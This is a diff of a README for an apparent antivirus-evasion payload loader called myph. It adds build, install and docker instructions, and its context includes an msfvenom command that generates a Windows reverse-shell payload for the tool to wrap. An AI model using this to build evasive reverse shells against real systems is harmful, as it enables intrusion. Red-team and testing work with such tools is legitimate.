@@ -12,7 +12,29 @@ for general information and testing. The tool and this repository are carefully 
 However, the developers cannot be held liable for for any damage, direct or indirect, of whatever nature as a result of
 or related to the access to or use of the software.
 
-## Usage
+## How to use the software ?
+
+> Please note this project is under development & subject to changes. Breaking changes can be introduced from release to release.
+
+### Compiling or Installing the project
+
+You can easily compile like so:
+```bash
+# if you have make installed
+make  # you can also use `make help` to check recipes
+
+# if you don't
+go build -o myph .
+```
+
+> You can also grab the latest release from [here](https://github.com/CMEPW/myph/releases/)
+
+Finally, you can install from the [golang package repository](https://pkg.go.dev/github.com/CMEPW/myph) like so:
+```bash
+go install github.com/CMEPW/myph@latest
+```
+
+### Usage
 
 ```bash
 Usage:
@@ -30,7 +52,6 @@ Flags:
   -v, --version              version for myph
 ```
 
-
 This tool uses the CRT method. If you don't know what that is, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~
 
 Generate a payload like so:
@@ -44,4 +65,14 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o ms
 
 # you should find your payload here
 file ./something/payload.exe
+```
+
+#### Using docker
+
+```bash
+# using makefile
+make docker
+
+# going through dockerfile directly
+docker build . -t myph:latest
 ```
